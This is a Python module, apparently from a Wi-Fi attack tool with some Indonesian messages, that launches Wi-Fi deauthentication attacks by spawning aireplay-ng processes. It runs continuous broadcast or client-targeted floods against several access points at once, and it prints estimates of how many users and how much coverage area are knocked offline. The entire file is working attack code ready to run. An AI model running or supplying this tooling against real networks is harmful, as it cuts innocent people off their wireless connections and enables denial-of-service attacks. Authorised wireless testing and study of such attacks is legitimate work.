# ============================================================
# ATTACK - Deauthentication attack functions
# ============================================================

import os
import subprocess
import time

from .config import MAX_TARGETS, DEAUTH_PACKETS, DEAUTH_DELAY, BURST_STAGGER
from .colors import Color
from .thermal import start_thermal_monitor, stop_thermal_monitor
from .interface import lock_channel_robust

# Global state
active_attack_processes = []


def kill_all_attacks():
    """Stop all running attack processes"""
    global active_attack_processes
    
    for proc in active_attack_processes:
        try:
            proc.terminate()
            proc.wait(timeout=2)
        except:
            try:
                proc.kill()
            except:
                pass
    active_attack_processes = []
    
    # Stop thermal monitoring
    stop_thermal_monitor()
    
    subprocess.call("pkill -f 'DEAUTH ATTACK'", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("pkill -f 'aireplay-ng --deauth'", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def deauth_attack_single_optimized(target, mon_iface, window_index=0, client_mac=None):
    """
    Attack single target WITHOUT setting channel
    (channel should already be locked before calling this)
    If client_mac is provided, target specific client (more effective!)
    
    Uses DEAUTH_PACKETS=0 for continuous attack (most effective)
    """
    global active_attack_processes
    
    # Warn about weak signal
    try:
        pwr = int(target.get('power', -100))
        if pwr < -70:
            print(f"{Color.WARNING}[!] WEAK SIGNAL ({pwr} dBm) - Move closer for better results!{Color.ENDC}")
    except:
        pass
    
    if client_mac:
        title = f"DEAUTH [{window_index+1}] {target['essid'][:10]} → {client_mac[-8:]}"
    else:
        title = f"DEAUTH [{window_index+1}] {target['essid'][:15]} (BROADCAST)"
    
    # Determine packet count (0 = continuous)
    packet_arg = DEAUTH_PACKETS if DEAUTH_PACKETS > 0 else 0
    
    if client_mac:
        # TARGETED deauth - attacks both directions (AP → Client, Client → AP)
        # Sends 128 packets per request (64 to AP + 64 to client)
        # This is MORE EFFECTIVE than broadcast!
        cmd = f"xterm -geometry 85x12+{window_index * 60}+{window_index * 40} " \
              f"-bg black -fg red -title '{title}' -e " \
              f"'aireplay-ng -0 {packet_arg} " \
              f"-a {target['bssid']} " \
              f"-c {client_mac} " \
              f"--ignore-negative-one {mon_iface}'"
    else:
        # BROADCAST deauth (all clients on AP)
        # WARNING: Some clients IGNORE broadcast deauth!
        cmd = f"xterm -geometry 85x12+{window_index * 60}+{window_index * 40} " \
              f"-bg black -fg red -title '{title}' -e " \
              f"'aireplay-ng -0 {packet_arg} " \
              f"-a {target['bssid']} " \
              f"--ignore-negative-one {mon_iface}'"
    
    proc = subprocess.Popen(
        cmd, 
        shell=True, 
        stdout=subprocess.DEVNULL, 
        stderr=subprocess.DEVNULL
    )
    active_attack_processes.append(proc)
    
    return proc


def deauth_attack_clients(target_ap, clients, mon_iface):
    """Attack AP with specific client targets"""
    global active_attack_processes
    
    print(f"\n{Color.FAIL}{'='*60}{Color.ENDC}")
    print(f"{Color.FAIL}[CLIENT-TARGETED ATTACK] {target_ap['essid']}{Color.ENDC}")
    print(f"{Color.FAIL}{'='*60}{Color.ENDC}")
    
    # Lock channel
    if not lock_channel_robust(mon_iface, target_ap['channel']):
        print(f"{Color.FAIL}[!] Attack dibatalkan - channel lock gagal{Color.ENDC}")
        return
    
    print(f"\n{Color.CYAN}[*] Targeting {len(clients)} specific clients...{Color.ENDC}")
    print(f"{Color.GREEN}[+] Mode: TARGETED (lebih efektif dari broadcast){Color.ENDC}")
    
    # Display clients
    print(f"\n{Color.CYAN}Clients to attack:{Color.ENDC}")
    for idx, client in enumerate(clients):
        print(f"  [{idx+1}] {client['station_mac']} | PWR: {client['power']} dBm")
    
    # Spawn attack per client (max 5)
    attack_count = min(len(clients), MAX_TARGETS)
    for idx in range(attack_count):
        client = clients[idx]
        deauth_attack_single_optimized(target_ap, mon_iface, idx, client['station_mac'])
        print(f"{Color.GREEN}[✓] Attack #{idx+1}: Client {client['station_mac']}{Color.ENDC}")
        time.sleep(BURST_STAGGER)
    
    print(f"\n{Color.GREEN}{'='*60}{Color.ENDC}")
    print(f"{Color.GREEN}[SUCCESS] {attack_count} targeted attacks running{Color.ENDC}")
    print(f"{Color.GREEN}{'='*60}{Color.ENDC}")
    
    # Start thermal monitoring
    start_thermal_monitor()
    
    print(f"\n{Color.WARNING}[IMPACT]{Color.ENDC}")
    print(f"  • Target AP: {target_ap['essid']}")
    print(f"  • Channel: {target_ap['channel']}")
    print(f"  • Clients attacked: {attack_count}")
    print(f"  • Mode: Directed deauth (64 pkts to AP + 64 pkts to client)")
    
    print(f"\n{Color.WARNING}[!] Close xterm windows OR Ctrl+C to stop{Color.ENDC}")


def deauth_attack_multi(targets, mon_iface):
    """Multi-target attack optimized for same-channel"""
    global active_attack_processes
    
    # Group by channel
    channels = {}
    for t in targets:
        ch = t['channel']
        if ch not in channels:
            channels[ch] = []
        channels[ch].append(t)
    
    print(f"\n{Color.FAIL}{'='*60}{Color.ENDC}")
    print(f"{Color.FAIL}[MULTI-TARGET] {len(targets)} targets{Color.ENDC}")
    print(f"{Color.FAIL}{'='*60}{Color.ENDC}")
    
    # Analyze deployment
    if len(channels) == 1:
        channel = list(channels.keys())[0]
        print(f"{Color.GREEN}[OPTIMAL!] All targets on Channel {channel}{Color.ENDC}")
        print(f"{Color.GREEN}[+] High-Density Mode: ENABLED{Color.ENDC}")
        
        # ✅ FIX: Lock channel 1x BEFORE spawning processes
        if not lock_channel_robust(mon_iface, channel):
            print(f"{Color.FAIL}[!] Attack dibatalkan - channel lock gagal{Color.ENDC}")
            return
        
        # Show channel info
        print(f"\n{Color.CYAN}[*] Verifying lock...{Color.ENDC}")
        os.system(f"iwconfig {mon_iface} | grep -i 'frequency\\|channel'")
        time.sleep(1)
    else:
        print(f"{Color.WARNING}[!] Targets di {len(channels)} channel berbeda!{Color.ENDC}")
        print(f"{Color.WARNING}[!] Efektivitas akan SANGAT berkurang!{Color.ENDC}")
        print(f"{Color.WARNING}[!] Rekomendasi: Pilih target di 1 channel saja{Color.ENDC}")
        
        cont = input(f"\n{Color.BOLD}Lanjut tetap? (y/n): {Color.ENDC}")
        if cont.lower() != 'y':
            return
    
    # Display targets
    print(f"\n{Color.CYAN}Target List:{Color.ENDC}")
    for idx, target in enumerate(targets):
        print(f"  [{idx+1}] {target['essid']:20s} | "
              f"BSSID: {target['bssid']} | "
              f"CH: {target['channel']:2s} | "
              f"PWR: {target['power']:3s} dBm")
    
    print(f"\n{Color.CYAN}[*] Starting attacks (DEAUTH_PACKETS={DEAUTH_PACKETS})...{Color.ENDC}")
    
    # ✅ FIX: Spawn processes WITHOUT setting channel per-process
    for idx, target in enumerate(targets):
        deauth_attack_single_optimized(target, mon_iface, idx)
        print(f"{Color.GREEN}[✓] Attack #{idx+1}: {target['essid']}{Color.ENDC}")
        time.sleep(BURST_STAGGER)  # Stagger for stability
    
    print(f"\n{Color.GREEN}{'='*60}{Color.ENDC}")
    print(f"{Color.GREEN}[SUCCESS] {len(targets)} attacks running{Color.ENDC}")
    print(f"{Color.GREEN}{'='*60}{Color.ENDC}")
    
    # Start thermal monitoring
    start_thermal_monitor()
    
    if len(channels) == 1:
        print(f"\n{Color.WARNING}[IMPACT ESTIMATE]{Color.ENDC}")
        print(f"  • Channel {list(channels.keys())[0]} coverage: DOWN")
        print(f"  • Affected APs: {len(targets)}")
        print(f"  • Estimated users affected: {len(targets) * 20}-{len(targets) * 100}")
        print(f"  • Coverage radius: ~50-100 meters (per AP)")
    
    print(f"\n{Color.WARNING}[!] Close xterm windows OR Ctrl+C to stop{Color.ENDC}")


def parse_target_selection(selection, max_len):
    """Parse user input for target selection (e.g., '1,2,3')"""
    indices = []
    selection = selection.replace(" ", "")
    parts = selection.split(",")
    
    for part in parts:
        part = part.strip()
        if not part:
            continue
            
        if part.isdigit():
            idx = int(part)
            if 1 <= idx <= max_len:
                if idx not in indices:
                    indices.append(idx)
            else:
                print(f"{Color.FAIL}[!] Invalid: {idx} (range: 1-{max_len}){Color.ENDC}")
                return None
        else:
            print(f"{Color.FAIL}[!] Invalid input: '{part}'{Color.ENDC}")
            return None
    
    return indices


def get_active_attack_count():
    """Get the number of active attack processes"""
    return len(active_attack_processes)
